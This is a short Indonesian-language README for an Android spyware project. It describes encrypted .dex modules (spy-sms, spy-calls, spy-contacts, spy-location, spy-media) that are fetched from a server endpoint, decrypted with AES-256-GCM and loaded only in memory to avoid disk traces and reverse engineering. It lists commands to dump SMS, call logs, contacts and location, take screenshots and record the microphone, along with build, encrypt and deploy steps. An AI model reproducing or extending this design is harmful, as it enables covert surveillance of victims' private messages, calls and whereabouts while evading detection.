# Dex Modules

Modul dikompile **terpisah** dari APK utama. Setiap modul di-serve sebagai
file `.dex` yang dienkripsi **AES-256-GCM** oleh server endpoint `/api/module/[name]`.

APK utama hanya berisi `DexModuleLoader` (loader + key XOR-obfuscated).
Kode sensitif **tidak ada** di APK — tidak bisa di-reverse engineer.

## Modul

| Module | Class | Commands |
|--------|-------|---------|
| `spy-sms` | `SmsModule` | `get_sms`, `get_sms:N` |
| `spy-calls` | `CallLogModule` | `get_calls`, `get_calls:N` |
| `spy-contacts` | `ContactsModule` | `get_contacts`, `get_contacts:N` |
| `spy-location` | `LocationModule` | `get_location` |
| `spy-media` | `MediaModule` | `screenshot`, `screenshot:W:Q`, `record_mic:N` |

## Build & Deploy

```bash
# 1. Build
cd android && ./gradlew :dex-modules:bundleReleaseAar

# 2. Extract .dex
unzip dex-modules/build/outputs/aar/dex-modules-release.aar classes.dex -d /tmp/

# 3. Encrypt per modul
node scripts/encrypt-dex.js /tmp/classes.dex public/modules/spy-sms.dex.enc
# (ulangi untuk tiap modul dengan class berbeda)

# 4. Deploy ulang Vercel — file .dex.enc sudah ada di public/modules/
```

## Flow Runtime

```
APK start → DexModuleLoader.preloadAll()
          → GET /api/module/spy-sms  (X-Device-Id header)
          → Server kirim [IV(12) + ciphertext + tag(16)]
          → AES-256-GCM decrypt di memory
          → InMemoryDexClassLoader  ← no disk write!
          → SmsModule.execute(ctx, "get_sms:50", null)
```
